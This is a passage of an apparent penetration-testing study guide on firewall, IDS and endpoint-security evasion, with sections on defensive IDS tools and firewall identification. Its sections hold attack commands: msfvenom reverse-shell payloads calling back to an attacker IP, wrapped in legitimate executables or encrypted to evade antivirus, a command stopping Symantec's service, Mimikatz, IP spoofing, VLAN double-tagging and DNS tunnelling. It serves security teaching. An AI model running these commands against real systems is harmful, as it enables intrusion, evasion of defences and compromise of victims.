```plaintext
https://157.240.23.35
```

**Limitations**: If the firewall tracks the IP directly, this method may fail.

---

## 3. Banner Grabbing

Banner grabbing involves extracting information from network services to identify their type and version. This method allows attackers to fingerprint services, gathering data on firewall vendor and firmware for potential exploitation.

### Example Command:
Using `telnet` for banner grabbing on SMTP:
```bash
telnet <target-domain> 25
```

### Example Output:
```plaintext
220 mail.targetcompany.com Microsoft ESMTP MAIL Service, Version: 8.5.9600.16384
```

---

## 4. Using a Proxy Server

Proxy servers conceal the origin IP, allowing users to bypass firewalls that restrict direct access.

### Steps to Configure Proxy on Windows:
1. Go to **Control Panel** > **Network and Internet** > **Internet Options**.
2. Under **Connections**, click **LAN settings**.
3. Check **Use a proxy server for your LAN**, enter proxy IP and port (e.g., `8080`), and click **OK** .

---

## 5. IP Address Spoofing

IP spoofing allows attackers to disguise their IP addresses, tricking firewalls into treating malicious packets as if they originated from a trusted source.

### Example:
To spoof an IP address using `hping3`:
```bash
hping3 -a <spoofed-IP> -c 1 -p 80 <target-IP>
```

### Use Case:
IP spoofing helps attackers bypass IP-based filtering rules by making packets appear from an internal or trusted network .

---

## 6. ICMP Tunnelling

ICMP Tunnelling encapsulates malicious data in ICMP packets (often used by tools like `ping`). Since ICMP is generally allowed for network diagnostics, firewalls may overlook the data within these packets.

### Tool: Loki
Loki creates an ICMP tunnel, enabling shell commands over ICMP packets.

---

## 7. Source Routing

Source routing allows the sender to dictate the packet’s path through the network. By controlling the packet route, attackers bypass specific network points, potentially avoiding firewall nodes.

### Example Command:
Using `ip` command to set source routing:
```bash
ip route add <target-IP> via <specific-router-IP>
```

**Types**:
- **Loose Source Routing**: Specifies intermediate routers.
- **Strict Source Routing**: Specifies exact route, making it hard for firewalls to filter effectively .

---

## 8. ACK Tunnelling and HTTP Tunnelling

- **ACK Tunnelling**: Embeds data within ACK packets, allowing attackers to hide communications within legitimate ACK packets.
- **HTTP Tunnelling**: Uses HTTP to encapsulate and send non-HTTP traffic, effectively hiding data in regular web traffic.

### Tool: HTTPort
HTTPort bypasses HTTP proxies, allowing Tunnelling over HTTP or HTTPS for accessing restricted resources .

---

## 9. Tiny Fragments

Attackers split packets into small fragments, hiding malicious payloads across multiple packets. This technique bypasses firewalls that only inspect the initial fragments of packets.

### Example:
Use `hping3` to create fragmented packets:
```bash
hping3 -f -d 40 <target-IP>
```

**Note**: This method exploits firewalls that only inspect the beginning of each packet .

---

## 10. SSH and DNS Tunnelling

- **SSH Tunnelling**: Uses SSH to create encrypted tunnels, bypassing firewalls that don't decrypt traffic.
- **DNS Tunnelling**: Uses DNS queries to tunnel data, bypassing firewalls that permit DNS traffic.

### Tools:
1. **OpenSSH**: For creating SSH tunnels.
   ```bash
   ssh -D 1080 user@remote-server
   ```
2. **Iodine**: For DNS Tunnelling, Tunnelling data through DNS requests.
   ```bash
   iodine -f -P password <dns-server-IP> <target-IP>
   ```

These tunnelling methods work around firewalls by leveraging protocols typically allowed for normal operations .

---

# **7. HTTP Tunnelling Techniques**

HTTP tunneling is a technique that encapsulates non-HTTP traffic within HTTP packets, allowing the traffic to pass through firewalls that typically restrict non-HTTP protocols. This technique is often used to bypass firewall restrictions and access restricted network resources by disguising traffic as legitimate HTTP requests.

---

## 1. HTTPort and HTTHost

HTTPort and HTTHost work together to create an HTTP tunnel, encapsulating data traffic over HTTP to bypass firewalls that block direct connections. HTTPort is typically used on the client side to establish a tunnel through a restrictive firewall.

### HTTPort

HTTPort creates a local proxy for the user, intercepting traffic and forwarding it over HTTP. It is designed to work with applications like web browsers or other client software that can connect through a proxy.

- **Features**:
  - Establishes an HTTP tunnel through restrictive firewalls.
  - Works with web browsers, instant messaging applications, and other software.
  - Compatible with SOCKS and HTTP proxies.

### Example Setup:

1. **Download HTTPort**: Install it on the client machine.
2. **Configure Proxy Settings**:
   - In HTTPort, set up the remote server (e.g., HTTHost) that will forward the traffic.
   - Configure the local application (e.g., web browser) to use HTTPort as its proxy.
3. **Start HTTPort**: HTTPort listens locally and forwards traffic through the configured HTTP tunnel.

**Use Case**: HTTPort is commonly used in environments with restrictive firewalls, where HTTP is the only allowed protocol. For example, it can be used to enable web browsing or SSH connections in restricted networks by wrapping traffic in HTTP requests.

---

## 2. Super Network Tunnel

Super Network Tunnel is a powerful tool that supports HTTP tunneling, among other protocols, to create virtual private connections over restrictive networks. It includes additional capabilities like SOCKS and HTTP proxy tunneling, making it versatile for bypassing network restrictions.

### Key Features:
- Supports HTTP, HTTPS, and SOCKS tunneling.
- Capable of creating virtual private networks (VPNs) over restricted networks.
- Allows users to connect applications restricted by firewalls through HTTP tunneling.

### Installation and Setup:

1. **Download and Install Super Network Tunnel**: Install it on both the client and server.
2. **Configuration**:
   - Configure the client application to use Super Network Tunnel as its proxy.
   - Set up the server as the endpoint to receive tunneled traffic.
3. **Start Tunneling**: Super Network Tunnel encapsulates the traffic as HTTP, bypassing network firewalls that block direct connections.

### Example Command:
Super Network Tunnel’s graphical interface allows configuration of HTTP/HTTPS settings, and does not require direct command-line input for basic setup.

**Use Case**: Super Network Tunnel is useful in environments where both HTTP and HTTPS are allowed but other protocols are restricted. For example, it can create a secure tunnel for applications that typically wouldn’t be accessible over HTTP, like VoIP or gaming services.

---
# **8. Bypassing NAC and Endpoint Security**

Network Access Control (NAC) and endpoint security solutions protect networks by enforcing security policies on devices accessing the network. Attackers may employ various techniques to bypass these controls, gaining unauthorized access to internal resources.

---

## 1. VLAN Hopping

VLAN hopping allows attackers to access different VLANs within a network, bypassing NAC restrictions. This can be done via **switch spoofing** (fooling switches to gain trunk access) or **double tagging** (sending packets with two VLAN tags).

### Example Command for VLAN Tagging:
Using Scapy in Python to craft double-tagged packets:
```python
from scapy.all import *

packet = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="10.0.0.1")/ICMP()
sendp(packet, iface="eth0")
```

**Mitigation**: Disable auto-trunking on switch ports, limit VLAN access.

---

## 2. Using Pre-authenticated Device

Attackers may clone or use a device already authenticated on the network to bypass NAC policies.

### Example Tool: MAC Address Changer
Change your device's MAC address to impersonate a pre-authenticated device:
```bash
sudo ifconfig eth0 hw ether 00:11:22:33:44:55
```

**Mitigation**: Implement device certificates for authentication, verify MAC address consistency.

---

## 3. Dechaining Macros

Macro dechaining involves unlinking malicious macros from recognized scripts, enabling the execution of macros that bypass endpoint security.

### Example:
Use Office documents with hidden macros and code to trigger payloads upon document opening. **Tools like Empire** can generate malicious macros.

**Mitigation**: Restrict macro execution, implement trusted macro sources.

---

## 4. Clearing Memory Hooks

Memory hooks used by security tools can be cleared or bypassed, preventing detection of malicious actions in the process memory.

### Tool: Mimikatz
Mimikatz can clear memory hooks set by security software:
```bash
mimikatz.exe "privilege::debug" "misc::memssp" "exit"
```

**Mitigation**: Use kernel-mode hooks, monitor unexpected memory changes.

---

## 5. Passing Encoded Commands

Encoded commands can evade signature-based endpoint detection by obfuscating malicious instructions, commonly used with PowerShell.

### Example Command:
```powershell
powershell.exe -EncodedCommand WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBlAHIALgBDAGwAaQBlAG4AdAA=
```

**Explanation**: Encodes commands in Base64 to obfuscate content.

**Mitigation**: Limit PowerShell use, enforce script-block logging.

---

## 6. Fast Flux DNS Method

Fast flux is a DNS evasion method that rapidly changes IP addresses associated with a domain, making it difficult to track malicious sites.

### Tool: Fast Flux DNS
Attackers use fast-flux techniques with DNS servers to continually change IPs for a domain, often via botnets.

**Mitigation**: Monitor DNS changes, block domains with frequent IP updates.

---

## 7. Ghostwriting

Ghostwriting manipulates executable signatures to bypass security checks, making malware appear benign.

### Example:
Use shellcode obfuscation and string encoding to avoid detection. Ghostwriting tools or manual binary modification can achieve this effect.

**Mitigation**: Enforce behaviour-based detection over signature-only methods.

---

## 8. Using Metasploit Templates

Metasploit provides templates that embed payloads within legitimate documents or executables, bypassing endpoint detection.

### Example Command:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-IP> LPORT=4444 -x legitimate.exe -k -f exe -o payload.exe
```

**Mitigation**: analyse file behaviour post-download, detect unusual connections.

---

## 9. Timing-based Evasion

Timing-based evasion involves sending packets at irregular intervals to avoid detection by endpoint security that relies on patterns.

### Example:
Use a tool like `hping3` to control packet send rate:
```bash
hping3 -i u10000 -S -p 80 <target-IP>
```

**Mitigation**: Implement IDS/IPS systems with anomaly-based detection.

---

## 10. Using Application Whitelisting

Application whitelisting bypass involves injecting malicious code into whitelisted applications to avoid security policies.

### Example Tool: AppJailLauncher
AppJailLauncher can inject payloads into allowed applications.

**Mitigation**: Implement behavioural analysis, monitor allowed application behaviours.

---

## 11. XLM Weaponization

Attackers use legacy Excel 4.0 (XLM) macros for persistence, as some endpoint tools do not scan these macros.

### Example:
Create an XLM macro in Excel to execute a PowerShell payload.

**Mitigation**: Disable legacy macro support, enforce strict macro policies.

---

## 12. Bypassing Symantec Endpoint Protection

Attackers may disable or bypass Symantec Endpoint Protection (SEP) through privilege escalation or disabling services.

### Example Command:
```bash
sc stop SepMasterService
```

**Mitigation**: Limit administrative access, monitor critical security services.

---

## 13. Hosting Phishing Sites

Phishing sites lure users into providing sensitive information by mimicking legitimate sites. Attackers often host these on temporary servers to avoid blacklist detection.

### Example:
Deploy a phishing site on a disposable server and send links to targets.

**Mitigation**: Implement URL filtering, use anti-phishing software, educate users.

---

# **9. Intrusion Detection Tools**

| Tool                  | Description                           |
| --------------------- | ------------------------------------- |
| Snort                 | Open-source IDS with real-time alerting |
| Suricata              | Advanced IDS/IPS with deep packet inspection |
| OSSEC                 | Host-based IDS with file integrity checking |
Intrusion Detection Systems (IDS) monitor network traffic and system activities to detect suspicious behaviour and potential threats. Here are some commonly used IDS tools, including open-source and commercial options.

---

## 1. Snort

Snort is a popular open-source IDS/IPS that provides real-time traffic analysis and packet logging. It uses rules-based detection to identify specific threats and network anomalies.

### Key Features:
- Signature-based detection
- Real-time traffic analysis
- Protocol analysis and content matching

### Installation:
```bash
sudo apt update
sudo apt install snort
```

### Basic Configuration:
In `/etc/snort/snort.conf`, specify the network:
```plaintext
ipvar HOME_NET 192.168.1.0/24
```

### Example Command:
Run Snort in IDS mode:
```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

**Use Case**: Detects SQL injections, brute force attacks, and other common network attacks.

---

## 2. Suricata

Suricata is an open-source IDS/IPS that supports multi-threading, enabling it to handle high-speed networks. It also offers advanced protocol detection, such as HTTP, SSL/TLS, and DNS.

### Key Features:
- Multi-threaded for high performance
- Supports IDS, IPS, and NSM (Network Security Monitoring)
- Detailed protocol parsing

### Installation:
```bash
sudo apt update
sudo apt install suricata
```

### Basic Configuration:
In `/etc/suricata/suricata.yaml`, define the network:
```yaml
HOME_NET: "[192.168.1.0/24]"
```

### Example Command:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

**Use Case**: Suitable for high-performance networks with complex protocol analysis.

---

## 3. Alien Vault OSSIM

AlienVault OSSIM is an open-source SIEM (Security Information and Event Management) tool that integrates various IDS tools, including Snort, Suricata, and OSSEC, providing a comprehensive security platform.

### Key Features:
- Unified security management with integrated tools
- Asset discovery and vulnerability assessment
- Centralized logging and event correlation

### Installation:
AlienVault OSSIM is available as a pre-configured ISO image that includes all components.

**Use Case**: Useful for organizations needing integrated security management with SIEM, IDS, and threat intelligence.

---

## 4. SolarWinds Security Event Manager

SolarWinds Security Event Manager (SEM) is a commercial SIEM tool that provides centralized logging, real-time monitoring, and automated response capabilities.

### Key Features:
- Centralized log management
- Real-time threat detection and alerts
- Automated incident response

### Deployment:
SolarWinds SEM is installed on a dedicated server, and logs from various sources are forwarded to it for analysis.

**Use Case**: Ideal for organizations with multiple devices, providing comprehensive event logging and automated responses to detected threats.

---

## 5. OSSEC

OSSEC is an open-source host-based IDS (HIDS) that monitors system activity, log files, rootkits, and more. It is highly customizable and often used for endpoint security.

### Key Features:
- Host-based monitoring with file integrity checking
- Log-based analysis
- Rootkit detection

### Installation:
```bash
curl -O https://updates.atomicorp.com/installers/atomic
sudo bash atomic
```

### Basic Configuration:
Edit `/var/ossec/etc/ossec.conf` to define the monitored paths and log sources.

**Use Case**: Effective for endpoint monitoring, detecting changes in critical files and suspicious log activity.

---

## 6. Bro/Zeek IDS

Zeek (formerly Bro) is a powerful network analysis tool that focuses on network security monitoring and is highly customizable. It is commonly used for detailed traffic analysis.

### Key Features:
- Network traffic analysis with event-driven scripting
- Protocol inspection and logging
- Anomaly detection

### Installation:
```bash
sudo apt update
sudo apt install zeek
```

### Example Command:
Run Zeek on a specified interface:
```bash
sudo zeek -i eth0 local
```

**Use Case**: Zeek is often used for in-depth network traffic analysis and forensic investigations.

---

## 7. AIDE

AIDE (Advanced Intrusion Detection Environment) is a file integrity checker that creates a database of file attributes, detecting unauthorized changes over time.

### Key Features:
- File integrity monitoring
- Detects changes in file permissions, ownership, and contents

### Installation:
```bash
sudo apt update
sudo apt install aide
```

### Example Command:
Initialize AIDE’s database:
```bash
sudo aideinit
```

**Use Case**: AIDE is effective for monitoring file changes on servers and critical systems, protecting against unauthorized modifications.

---

## 8. Sagan Log Analysis Engine

Sagan is a real-time log analysis and correlation engine designed to complement IDS solutions like Snort. It processes log files for suspicious activity and can respond to events.

### Key Features:
- Real-time log processing and event correlation
- Supports log normalization and GEO-IP detection
- Compatible with Snort rules

### Installation:
Sagan installation requires a compatible system, and it uses Snort or Suricata rule syntax for log analysis.

**Use Case**: Sagan is useful for detecting attacks based on log files, such as web server logs, making it a versatile addition to existing IDS systems.
---

# **10. Firewall Identification Techniques**

Firewall identification techniques help attackers and penetration testers determine the presence, type, and configuration of firewalls in a network. By understanding how firewalls filter and respond to traffic, security professionals can better evaluate the security posture of a network and identify potential weaknesses.

---

## 1. Port Scanning

Port scanning is a technique used to identify open, closed, or filtered ports on a network. It helps determine firewall rules by identifying which ports are accessible and how the firewall responds to different types of traffic.

### Common Tools:
- **Nmap**: A versatile network scanner that can perform comprehensive port scans.
- **Masscan**: Known for its speed, Masscan can scan large networks quickly, providing an overview of firewall configurations.

### Types of Port Scans:

1. **SYN Scan**: Sends a SYN packet to each port. If the firewall permits traffic, the target responds with SYN-ACK, indicating the port is open. Firewalls that filter traffic may drop or reset the connection.
   ```bash
   nmap -sS -p 1-1000 <target-IP>
   ```

2. **ACK Scan**: Tests whether the firewall is stateful by sending ACK packets. If there’s no response, the firewall is likely stateful and filtering traffic based on connection state.
   ```bash
   nmap -sA <target-IP>
   ```

3. **XMAS and FIN Scans**: These scans use unusual packet flags to determine how the firewall handles non-standard packets, which can reveal filtered ports.
   ```bash
   nmap -sX <target-IP>     # XMAS scan
   nmap -sF <target-IP>     # FIN scan
   ```

**Use Case**: Port scanning helps determine open ports and filtering rules enforced by firewalls. For example, if only common ports (e.g., 80, 443) are open, it may indicate a restrictive firewall configuration.

---

## 2. Firewalking

Firewalking is a technique that maps firewall rules by sending packets with specific Time-To-Live (TTL) values to determine if a firewall forwards or drops packets to certain ports or IP addresses. Firewalking is useful for identifying which ports are allowed through the firewall.

### How Firewalking Works:
1. The attacker sends packets with TTL values set to expire one hop beyond the firewall.
2. If the packet is allowed, it reaches the target and a response is received.
3. If the packet is dropped, no response is received, indicating that the firewall filters that port or protocol.

### Example Tool: Firewalk
Firewalk is a dedicated tool for performing this technique. It sends packets with incremental TTL values to map out firewall rules.

**Basic Command**:
```bash
firewalk -S -p 80 -n -T 1 -r 3 <gateway-IP> <target-IP>
```

- `-S`: Scan mode
- `-p`: Specify port to test
- `-n`: Don’t resolve hostnames
- `-T`: Timeout for responses
- `-r`: Retry count

### Example Using Nmap
Nmap also supports traceroute functionality, which can provide insights into firewall rules:
```bash
nmap -Pn --traceroute <target-IP>
```

**Use Case**: Firewalking can help determine which ports are allowed through the firewall. For example, if only web and email ports (80, 443, 25) return responses, it indicates restrictive filtering for other ports.

---

# **11. Firewall Evasion Tools**

Firewall evasion tools are used to bypass network firewalls by modifying the characteristics of packets or using stealth techniques. These tools help attackers and penetration testers reach restricted areas in a network by avoiding detection and filtering mechanisms.

---

## 1. Nmap

Nmap is a powerful network scanning tool that can be used to map networks, detect open ports, and evade firewall detection. It offers various techniques for evading firewalls, including altering packet timing, fragmenting packets, and using decoy IP addresses.

### Key Evasion Techniques:

1. **Fragmentation**: Breaks packets into small fragments, potentially bypassing firewalls that only inspect the first few bytes.
   ```bash
   nmap -f <target-IP>
   ```

2. **Decoy Scanning**: Spoofs multiple IP addresses to obscure the true source of the scan.
   ```bash
   nmap -D RND:10 <target-IP>
   ```

3. **Timing Options**: Adjusts packet timing to avoid triggering IDS/IPS.
   ```bash
   nmap -T2 <target-IP>
   ```

4. **MAC Address Spoofing**: Changes the MAC address to evade detection.
   ```bash
   nmap --spoof-mac 00:11:22:33:44:55 <target-IP>
   ```

**Use Case**: Nmap’s firewall evasion techniques are used to conduct stealth scans, allowing testers to identify open ports without triggering firewall alerts.

---

## 2. Metasploit

The Metasploit Framework is a widely used exploitation and penetration testing platform that includes tools for bypassing firewalls and IDS/IPS systems. Metasploit can use encoded payloads, tunneling, and session hiding techniques to evade detection.

### Key Evasion Techniques:

1. **Encoded Payloads**: Encodes payloads to avoid signature-based detection.
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
   ```

2. **Payload Stagers**: Splits the payload into smaller pieces that evade detection.
3. **Meterpreter Session Migration**: Migrates to another process after exploitation to avoid termination.
   ```plaintext
   meterpreter > migrate <PID>
   ```

**Use Case**: Metasploit’s evasion capabilities are essential in penetration testing, allowing attackers to establish persistent sessions while avoiding firewall and IDS/IPS detection.

---

## 3. IDS Evasion

IDS evasion involves modifying attack techniques and traffic patterns to avoid detection by Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS). Various tools and methods are available to bypass IDS, including obfuscation, fragmentation, and session splicing.
### Common Techniques:

1. **Session Splicing**: Breaks the payload across multiple packets, making it harder for IDS to detect the attack.
2. **Obfuscation**: Modifies payloads to evade signature-based detection.
3. **Payload Fragmentation**: Splits the payload into fragments, bypassing IDS systems that do not reassemble packets.

### Example Command with Fragroute:
```bash
fragroute -f /path/to/config-file <target-IP>
```

**Use Case**: IDS evasion techniques help attackers bypass IDS/IPS systems, allowing malicious payloads to reach the target without being detected.

---

## 4. Hyperion

Hyperion is a runtime crypter that encrypts malicious payloads, allowing them to evade antivirus and IDS/IPS systems. By encoding payloads at runtime, Hyperion prevents signature-based detection, making it harder for security systems to identify malicious executables.

### Key Features:
- Encrypts payloads at runtime to avoid detection.
- Designed to bypass antivirus engines that rely on static analysis.

### Example Command:
Generate a payload with Metasploit and encrypt it with Hyperion:
1. **Generate Payload with Metasploit**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-IP> LPORT=4444 -f exe > payload.exe
   ```

2. **Encrypt with Hyperion**:
   ```bash
   Hyperion.exe payload.exe encrypted_payload.exe
   ```

**Use Case**: Hyperion is commonly used to bypass antivirus software, allowing penetration testers and attackers to deploy payloads that evade static analysis-based detection mechanisms.
